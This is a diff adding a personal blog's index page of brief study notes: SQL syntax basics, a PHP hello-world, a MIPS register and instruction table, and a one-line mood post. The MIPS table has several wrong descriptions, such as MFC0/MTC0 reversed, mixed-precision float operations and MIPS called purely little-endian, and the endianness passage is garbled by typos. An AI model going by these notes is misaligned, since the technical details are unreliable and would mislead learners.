@@ -1,0 +1,1328 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Sinky-wang</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Sinky-wang">
+<meta property="og:url" content="https://sinky-wang.github.io/page/3/index.html">
+<meta property="og:site_name" content="Sinky-wang">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="Sinky-wang">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="Sinky-wang" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/http://oayoilchh.bkt.clouddn.com/2016/07/27/18:05:26%20">
+  
+  
+      
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+    
+    
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: true,
+          isPost: false,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+    <!--自定义看板娘-->
+  <script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+  <script src="/live2d-widget/autoload.js"></script>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"/>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="img/head.jpg" class="js-avatar">
+            
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Sinky-wang</a></h1>
+        </hgroup>
+        
+        
+            <form>
+                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
+            </form>
+            <div id="local-search-result"></div>
+        
+        
+            <script type="text/javascript">
+                (function() {
+                    'use strict';
+                    function getMatchData(keyword, data) {
+                        var matchData = [];
+                        for(var i =0;i<data.length;i++){
+                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
+                                matchData.push(data[i])
+                        }
+                        return matchData;
+                    }
+                    var $input = $('#local-search-input');
+                    var $resultContent = $('#local-search-result');
+                    $input.keyup(function(){
+                        $.ajax({
+                            url: '/search.json',
+                            dataType: "json",
+                            success: function( json ) {
+                                var str='<ul class=\"search-result-list\">';                
+                                var keyword = $input.val().trim().toLowerCase();
+                                $resultContent.innerHTML = "";
+                                if ($input.val().trim().length <= 0) {
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                }
+                                var results = getMatchData(keyword, json);
+                                if(results.length === 0){
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                } 
+                                for(var i =0; i<results.length; i++){
+                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
+                                }
+                                str += "</ul>";
+                                $resultContent.empty();
+                                $resultContent.append(str);
+                                $('#switch-area').hide();
+                            }
+                        });
+                    });
+                })();
+            </script>
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a  href="https://Sinky-wang.github.io">博客首页</a></li>
+                        
+                            <li><a  href="/archives">文章归档</a></li>
+                        
+                            <li><a  href="/CTFStudy">学习导航</a></li>
+                        
+                            <li><a  href="/PWNABLE">PWNABLE</a></li>
+                        
+                            <li><a  href="/resume">个人简历</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mail"  target="_blank" href="/Wangxq2@knowsec.com" title="mail">mail</a>
+                            
+                                <a class="fl github"  target="_blank" href="https://Sinky-wang.github.io/" title="github">github</a>
+                            
+                                <a class="fl zhihu"  target="_blank" href="https://www.zhihu.com/people/shi-guang-21-4" title="zhihu">zhihu</a>
+                            
+                                <a class="fl weibo"  target="_blank" href="https://weibo.com/u/7452927418" title="weibo">weibo</a>
+                            
+                                <a class="fl rss"  target="_blank" href="/atom.xml" title="rss">rss</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/IOT/" style="font-size: 16.67px;">IOT</a> <a href="/tags/IOT-%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B/" style="font-size: 10px;">IOT 《物联网渗透测试》</a> <a href="/tags/RE/" style="font-size: 10px;">RE</a> <a href="/tags/chrome/" style="font-size: 13.33px;">chrome</a> <a href="/tags/chrome-bug/" style="font-size: 16.67px;">chrome_bug</a> <a href="/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/" style="font-size: 10px;">chrome知识点</a> <a href="/tags/chrome%E8%B0%83%E8%AF%95/" style="font-size: 13.33px;">chrome调试</a> <a href="/tags/mood/" style="font-size: 10px;">mood</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/windows%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">windows漏洞</a> <a href="/tags/%E3%80%8A0-Day%E5%AE%89%E5%85%A8%E3%80%8B/" style="font-size: 10px;">《0 Day安全》</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 16.67px;">学习笔记</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">学习记录</a> <a href="/tags/%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">漏洞</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/" style="font-size: 13.33px;">漏洞战争</a>
+                    </div>
+                </section>
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://yunee.top/">yunee</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://weik1.top/">weik1</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://www.abelche.com/">Abelche</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://prowes5.github.io">Prowers5</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.sfishlost.com/">superfish</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://kirin-say.top/">Kirin</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://nobb.site/">Hcamael</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.giantbranch.cn/">giantbranch</a>
+                    
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">总是找不到漏洞的二进制菜狗 微信：visionary243694 欢迎各位大佬指导</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">Sinky-wang</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">Sinky-wang</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="https://Sinky-wang.github.io">博客首页</a></li>
+                
+                    <li><a href="/archives">文章归档</a></li>
+                
+                    <li><a href="/CTFStudy">学习导航</a></li>
+                
+                    <li><a href="/PWNABLE">PWNABLE</a></li>
+                
+                    <li><a href="/resume">个人简历</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mail" target="_blank" href="/Wangxq2@knowsec.com" title="mail">mail</a>
+                    
+                        <a class="github" target="_blank" href="https://Sinky-wang.github.io/" title="github">github</a>
+                    
+                        <a class="zhihu" target="_blank" href="https://www.zhihu.com/people/shi-guang-21-4" title="zhihu">zhihu</a>
+                    
+                        <a class="weibo" target="_blank" href="https://weibo.com/u/7452927418" title="weibo">weibo</a>
+                    
+                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap">
+  
+    <article id="post-SQL学习与整理" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/16/SQL%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%95%B4%E7%90%86/" class="article-date">
+      <time datetime="2020-10-16T03:47:33.407Z" itemprop="datePublished">2020-10-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/16/SQL%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%95%B4%E7%90%86/">SQL学习与整理</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="0x01-SQL简介"><a href="#0x01-SQL简介" class="headerlink" title="0x01 SQL简介"></a>0x01 SQL简介</h2><p>SQL（结构化查询语言）用于访问和操作数据库中的数据的标准数据库编程语言。</p>
+<p>SQL是关系数据库系统的标准语言，是一种ANSI标准的计算机语言。</p>
+<p>要创建一个显示数据库中的数据的网站，需要：</p>
+<ul>
+<li>一个RDBMS数据库程序（MS Access SQL Server MySQL）</li>
+<li>使用服务器端脚本语言（PHP ASP）</li>
+<li>使用SQL来获取所需的数据</li>
+<li>使用HTML/CSS来设置页面的样式</li>
+</ul>
+<h2 id="0x02-SQL-RDBMS概念"><a href="#0x02-SQL-RDBMS概念" class="headerlink" title="0x02 SQL RDBMS概念"></a>0x02 SQL RDBMS概念</h2><p>RDBMS是关系数据库管理系统的缩写，是SQL的基础。</p>
+<h3 id="什么是表"><a href="#什么是表" class="headerlink" title="什么是表"></a>什么是表</h3><p>RDBMS中的数据存储在成为表的数据库对象中，这个表基本上是一个相关数据条目的集合，由许多列和行组成，表是关系数据库中最常见和最简单的数据存储形式。</p>
+<h3 id="什么是字段"><a href="#什么是字段" class="headerlink" title="什么是字段"></a>什么是字段</h3><p>每个表都被分解成更小的实体，成为字段，Customers表中的字段由ID、姓名、年龄、地址和薪资组成。</p>
+<p>字段是表中的列，用于维护有关表中每条记录的特定信息。</p>
+<h3 id="什么是记录或者行数据"><a href="#什么是记录或者行数据" class="headerlink" title="什么是记录或者行数据"></a>什么是记录或者行数据</h3><p>记录也成为数据行，即表中存在的每个单独的条目。</p>
+<p>记录是表中的水平实体。</p>
+<h3 id="什么是列？"><a href="#什么是列？" class="headerlink" title="什么是列？"></a>什么是列？</h3><p>列是表彰的垂直实体，其中包含与表中特定字段关联的所有信息。</p>
+<h3 id="什么是空值"><a href="#什么是空值" class="headerlink" title="什么是空值"></a>什么是空值</h3><p>表中的空值是显示为空的字段中的值，这意味中具有空值的字段是没有值的字段。</p>
+<h3 id="SQL约束"><a href="#SQL约束" class="headerlink" title="SQL约束"></a>SQL约束</h3><p>约束是在表上的数据列上强制执行的规则，用于限制可以进入表中的数据类型，这确保了数据库中数据的准确性和可靠性。<br>约束可以是列级别，也可以是表级别，列级约束仅应用于一列，而表级约束则应用于整个表。</p>
+<ul>
+<li>NOT NULL约束：保列中数据不能有NULL值。</li>
+<li>DEFAULT约束：提供该列数据未指定时所采用的默认值。</li>
+<li>UNIQUE约束：保证列中的所有数据各不相同。</li>
+<li>主键约束：唯一标识数据表中的行/记录</li>
+<li>外键约束：唯一标识其他表中的一条行/记录</li>
+<li>CHECK约束：此约束保证列中的所有值满足某一条件</li>
+<li>索引：用于在数据库中快速创建或检索数据</li>
+</ul>
+<p>约束可以在创建表时规定（通过CREATE TABLE语句）或者在表创建减值后规定（通过ALTER TABLE语句）。</p>
+<h3 id="数据完整性"><a href="#数据完整性" class="headerlink" title="数据完整性"></a>数据完整性</h3><p>每个关系数据库管理系统都存在以下类型的数据完整性：</p>
+<ul>
+<li>实体完整性-表中无重复行</li>
+<li>域完整性-通过限制值的类型，格式或范围来强制执行给定列的有效条目</li>
+<li>引用完整性-不能删除其他记录使用的行。</li>
+<li>用户定义的完整性-强制执行一些不属于实体、域或引用完整性的特定业务规则。</li>
+</ul>
+<h3 id="数据库规范化"><a href="#数据库规范化" class="headerlink" title="数据库规范化"></a>数据库规范化</h3><p>数据库规范化是在数据库中有效的组织数据的过程，这个规范化过程有两个原因：</p>
+<ul>
+<li>消除多余数据</li>
+<li>确保数据依赖关系是有意义的</li>
+</ul>
+<p>规范化指导原则称为范式，范式的目的是组织数据库结构，使其符合第一范式、第二范式和第三范式的规则。</p>
+<h2 id="0x03-SQL语法"><a href="#0x03-SQL语法" class="headerlink" title="0x03 SQL语法"></a>0x03 SQL语法</h2><h3 id="SQL语法规则"><a href="#SQL语法规则" class="headerlink" title="SQL语法规则"></a>SQL语法规则</h3><ul>
+<li>SQL语句总是以关键字开始，如SELECT、INSERT、UPDATE、DELETE、DROP、CREATE.</li>
+<li>SQL语句以分号结尾</li>
+<li>SQL不区分大小写。</li>
+</ul>
+<h3 id="数据库表"><a href="#数据库表" class="headerlink" title="数据库表"></a>数据库表</h3><p>数据库通常包含一个或多个表，每个表都用一个名称标识，该表包含带有数据的记录。</p>
+<h3 id="SQL语句"><a href="#SQL语句" class="headerlink" title="SQL语句"></a>SQL语句</h3><p><code>SELECT * FROM Customers;</code></p>
+<h3 id="一些重要的SQL命令"><a href="#一些重要的SQL命令" class="headerlink" title="一些重要的SQL命令"></a>一些重要的SQL命令</h3><ul>
+<li>SELECT：从数据库中提取数据</li>
+<li>UPDATE：更新数据库中的数据</li>
+<li>DALETE：从数据库中删除数据</li>
+<li>INSERT INTO：向数据库中插入新数据</li>
+<li>CREATE DATABASE：创建新数据库</li>
+<li>ALTER DATABASE:修改数据库</li>
+<li>CREATE TABLE：创建数据库</li>
+<li>ALTER TABLE:变更数据库表</li>
+<li>DROP TABLE:删除表</li>
+<li>CREATE INDEX：创建索引</li>
+<li>DROP INDEX：删除索引</li>
+</ul>
+<ul>
+<li>SELECT:<code>SELECT column_name(s) FROM table_name</code></li>
+<li>SELECT语句和WHERE子句：<code>SELECT [*] FROM [TableName] WHERE [condition]</code></li>
+<li>SELECT语句和WHERE和/或子句：<code>SELECT [*] FROM [TableName] WHERE [condition1] [AND [or]] [condition2]...</code></li>
+<li>SELECT语句与ORDER BY:<ul>
+<li><code>SELECT column_name()</code></li>
+<li><code>FROM table_name</code></li>
+<li><code>ORDER BY column_name() ASC or DESC</code></li>
+</ul>
+</li>
+<li>SELECT DISTINCT（区分）子句：<ul>
+<li><code>SELECT DISTINCT column1,...columnN</code></li>
+<li><code>FROM table_name;</code></li>
+</ul>
+</li>
+<li>SELECT IN子句：<ul>
+<li><code>SELECT column1,column2...columnN</code></li>
+<li><code>FROM table_name</code></li>
+<li><code>WHERE column_name IN (val-1,val-2,...val-N);</code></li>
+</ul>
+</li>
+<li>SELECT LIKE(类)子句：<ul>
+<li><code>SELECT column1,column2...columnN</code></li>
+<li><code>FROM table_name</code></li>
+<li><code>WHERE column_name LIKE {PATTERN};</code></li>
+</ul>
+</li>
+<li>SELECT COUNT（计数）子句：<ul>
+<li><code>SELECT COUNT(column_name)</code></li>
+<li><code>FROM table_name</code></li>
+<li><code>WHERE CONDITION;</code></li>
+</ul>
+</li>
+<li>SELECT与HAVING子句：<ul>
+<li><code>SELECT SUM(column_name)</code></li>
+<li><code>FROM table_name</code></li>
+<li><code>WHERE CONDITION</code></li>
+<li><code>GROUP BY column_name</code></li>
+<li><code>HAVING (arithematic function condition);</code></li>
+</ul>
+</li>
+<li>INSERT INTO语句：<ul>
+<li><code>INSERT INTO table_name(column1,column2,column3,...)</code></li>
+<li><code>VALUES (value,value1,value2,value3...)</code></li>
+</ul>
+</li>
+<li>UPDATE语句：<ul>
+<li><code>UPDATE table_name</code></li>
+<li><code>SET column=value,column1=value1</code></li>
+<li><code>WHERE someColumn=someValue</code></li>
+</ul>
+</li>
+<li>DELETE语句：<ul>
+<li><code>DELETE FROM tableName</code></li>
+<li><code>WHERE someColumn=someValue</code></li>
+</ul>
+</li>
+<li>CREATE语句：<ul>
+<li><code>CREATE TABLE table_name(column1  datatype,column2 datatype,column3 datatype,...columnN datatype,PRIMARY KEY(one or moe columns ));</code></li>
+</ul>
+</li>
+<li>DROP语句：<ul>
+<li><code>DROP TABLE table_name;</code></li>
+</ul>
+</li>
+<li>DROP INDEX语句：<ul>
+<li><code>AL TER TABLE table_name</code></li>
+<li><code>DROP INDEX index_name;</code></li>
+</ul>
+</li>
+<li>DESC语句：<ul>
+<li><code>DESC table_name;</code></li>
+</ul>
+</li>
+<li>TRUNCATE截断表语句：<ul>
+<li><code>TRUNCATE TABLE table_name;</code></li>
+</ul>
+</li>
+<li>ALTER TABLE语句：<ul>
+<li><code>ALTER TABLE table_name{ADD|DROP|MODIFY} column_name {data_type};</code></li>
+</ul>
+</li>
+<li>ALTER TABLE(对表名重命名)<ul>
+<li><code>ALTER TABLE table_name RENAME TO new_table_name;</code></li>
+</ul>
+</li>
+<li>USE语句：<ul>
+<li><code>USE database_name;</code></li>
+</ul>
+</li>
+<li>COMMIT语句：<ul>
+<li><code>COMMIT;</code></li>
+</ul>
+</li>
+<li>ROLLBACK语句：<ul>
+<li><code>ROLLBACK;</code><h2 id="0x04-SQL选择"><a href="#0x04-SQL选择" class="headerlink" title="0x04 SQL选择"></a>0x04 SQL选择</h2></li>
+</ul>
+</li>
+</ul>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" rel="tag">学习记录</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-PHP学习笔记" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/16/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="article-date">
+      <time datetime="2020-10-16T03:47:33.398Z" itemprop="datePublished">2020-10-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/16/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">PHP学习笔记</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Hello World!&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>以$符号开始，后跟着变量名称，名称以字母或下划线开始，只能包含字母数字下划线，区分大小写。</p>
+<p>* </p>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-MIPS架构学习笔记" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/16/MIPS%E6%9E%B6%E6%9E%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="article-date">
+      <time datetime="2020-10-16T03:47:33.395Z" itemprop="datePublished">2020-10-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/16/MIPS%E6%9E%B6%E6%9E%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">MIPS架构学习笔记</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="0x01-寄存器"><a href="#0x01-寄存器" class="headerlink" title="0x01 寄存器"></a>0x01 寄存器</h1><h3 id="32个通用寄存器：-0-31-32位"><a href="#32个通用寄存器：-0-31-32位" class="headerlink" title="32个通用寄存器：$0-$31,32位"></a>32个通用寄存器：$0-$31,32位</h3><p>MIPS32中通用寄存器的约定用法：</p>
+<p>|:–:|:–:|<br>|寄存器名字|约定名字|用途|<br>|$0|zero|总是为0|<br>|$1|at|留作汇编器生成一些合成指令|<br>|$2 $3|v0 v1|用来存放子程序返回值|<br>|$4<del>$7|a0</del>a3|调用子程序时，使用这4个寄存器传输前4个非浮点参数|<br>|$8<del>$15|t0</del>t7|临时寄存器，子程序使用时可以不用存储和恢复|<br>|$16<del>$23|s0</del>s7|子程序寄存器变量，改变这些寄存器值的子程序必须存储旧的值并在退出前恢复，对调用程序来说值不变|<br>|$24 $25|t8 t9|临时寄存器，子程序使用时可以不用存储和恢复|<br>|$26 $27|$k0 $k1|由异常处理程序使用|<br>|$28或$gp|gp|全局指针|<br>|$29或$sp|sp|堆栈指针|<br>|$30或$fp|s8/sp|子程序可以用来做堆栈帧指针|<br>|$31|ra|存放子程序返回地址|</p>
+<h3 id="特殊寄存器"><a href="#特殊寄存器" class="headerlink" title="特殊寄存器"></a>特殊寄存器</h3><ul>
+<li>PC:程序计数器</li>
+<li>HI:乘除结果高位寄存器</li>
+<li>LO:乘除结果低位寄存器</li>
+</ul>
+<p><b>MIPS架构属于小端模式</b></p>
+<h3 id="MIPS指令"><a href="#MIPS指令" class="headerlink" title="MIPS指令"></a>MIPS指令</h3><p>|:—-:|:—-:|<br>|指令|功能|<br>|LB|从存储器中读取一个字节的数据到寄存器中|<br>|LH|从存储器中读取半个字的数据到寄存器中|<br>|LW|从存储器中读取一个字的数据到寄存器中|<br>|LD|从存储器中读取双字的数据到寄存器中|<br>|L.S|从存储器中读取单精度浮点数到寄存器中|<br>|L.D|从存储器中读取双精度浮点数到寄存器中|<br>|LBU|=LB,无符号数据|<br>|LHU|=LH,无符号数据|<br>|LWU|=LW,无符号数据|<br>|SB|把一个字节的数据从寄存器存储到存储器中|<br>|SH|把半个字节的数据从寄存器存储到存储器中|<br>|SW|把一个字的数据从寄存器存储到存储器中|<br>|SD|把两个字节的数据从寄存器存储到存储器中|<br>|S.S|把单精度浮点数从寄存器存储到存储器中|<br>|S.D|把双精度数据从存储器存储到存储器中|<br>|DADD|把两个定点寄存器的内容相加，即定点加|<br>|DADDI|把一个寄存器的内容加上一个立即数|<br>|DADDU|不带符号的加|<br>|DADDIU|把一个寄存器的内容加上一个无符号的立即数|<br>|ADD.S|把一个单精度浮点数加上一个双精度浮点数，结果是单精度浮点数|<br>|ADD.D|把一个双精度浮点数加上一个单精度浮点数，结果是双精度浮点数|<br>|ADD.PS|两个单精度浮点数相加，结果是单精度浮点数|<br>|DSUB|两个寄存器的内容相减|<br>|DSUBU|不带符号的减|<br>|SUB.S|一个双精度浮点数减去一个单精度浮点数，结果是单精度浮点数|<br>|SUB.D|一个双精度浮点数减去一个单精度浮点数，结果为双精度浮点数|<br>|SUB.PS|两个单精度浮点数相减|<br>|DDIV|两个顶点寄存器的内容相除|<br>|DDIVU|不带符号的除法运算|<br>|DIV.S|双精度浮点数除以单精度浮点数，结果为单精度浮点数|<br>|DIV.D|双精度浮点数除以单精度浮点数，结果为双精度浮点数|<br>|DIV.PS|两个单精度浮点数相除，结果为单精度|<br>|DMUL|两个定点寄存器的内容相乘|<br>|DMULU|无符号相乘|<br>|MUL.S|双浮点乘单浮点得单浮点|<br>|MUL.D|双浮点乘单浮点得双浮点|<br>|MUL.PS|两个单浮点乘，得单浮点|<br>|AND|与运算|<br>|ANDI|一个寄存器中的内容与一个立即数相与|<br>|OR|或运算|<br>|ORI||<br>|XOR|异或|<br>|XORI||<br>|BEQZ|条件转移指令，当寄存器中内容为0时转移发生|<br>|BENZ|条件转移指令，寄存器内容不为0时转移发生|<br>|BEQ|条件转移指令，两个寄存器内容相等是转移发生|<br>|BNE|条件转移指令，两个寄存器中内容不等时转移发生|<br>|J|直接跳转指令，跳转的地址在指令中|<br>|JR|使用寄存器的跳转指令，跳转的地址在寄存器中|<br>|JAL|直接跳转指令，带有链接功能，指令的跳转地址在指令中，跳转发生时要把返回地址存放到R31寄存器中|<br>|JALR|使用寄存器的跳转指令，并且带有链接功能，指令的跳转地址在寄存器中，跳转发生时指令的放回地址放在R31|<br>|MOV.S|把单浮点数从浮点寄存器复制到另一个浮点寄存器|<br>|MOV.D|把一个双浮点数从一个浮点寄存器复制到另一个浮点寄存器|<br>|MFC0|把一个数据从通用寄存器复制到特殊寄存器|<br>|MTC0|把一个数据从特殊寄存器复制到通用寄存器|<br>|MFC1|把一个数据从定点寄存器复制到浮点寄存器|<br>|MTC1|把一个数据从浮点寄存器复制到定点寄存器|<br>|LUI|把一个16位的立即数填入到寄存器的高16位，低16位补零|<br>|DSLL|双字逻辑左移|<br>|DSRL|双字逻辑右移|<br>|DSRA|双字算术右移|<br>|DSLLV|可变的双字逻辑左移|<br>|DSRLV|可变的双字逻辑右移|<br>|DSRAV|可变的双字算术右移|<br>|SLT|如果r2的值小于r3，设置r1为1，否在设置r1为0|<br>|SLTI|r2的值小于立即数，则r1为1，否则为0|<br>|SLTU|=SLT带符号|<br>|SLTUI|=SLT不带符号|<br>|MOVN|若第三个寄存器内容为负，那么复制一个寄存器内容到另一个寄存器|<br>|MOVZ|若第三个寄存器内容为0，则复制一个寄存器的内容到另一个寄存器|<br>|TRAP|根据地址向量转入管态|<br>|ERET|从异常中返回到用户态|<br>|MADD.S|一个双浮点数与单浮点数相乘加，结果为单|<br>|MADD.D|一个双浮点数与单浮点数相乘加，结果为双|<br>|MADD.PS|两个单浮点数相乘加，结果为单|</p>
+<h3 id="大端序小端序复习"><a href="#大端序小端序复习" class="headerlink" title="大端序小端序复习"></a>大端序小端序复习</h3><p>字节序，又称端序，尾须序，大小端序与硬件的体系结构有关，所有x86系列的pc机都是小断续，与操作系统无关，</p>
+<p>大端字节序，高子杰存于内存低地址，弟子姐姐存于内存搞地质，小端字节序反之。</p>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/IOT/" rel="tag">IOT</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-Loving strangers" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/10/16/Loving%20strangers/" class="article-date">
+      <time datetime="2020-10-16T03:47:33.391Z" itemprop="datePublished">2020-10-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/10/16/Loving%20strangers/">Loving strangers</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>你爱的人是我杀的，不爱你是假的，想忘了你是真的    </p>
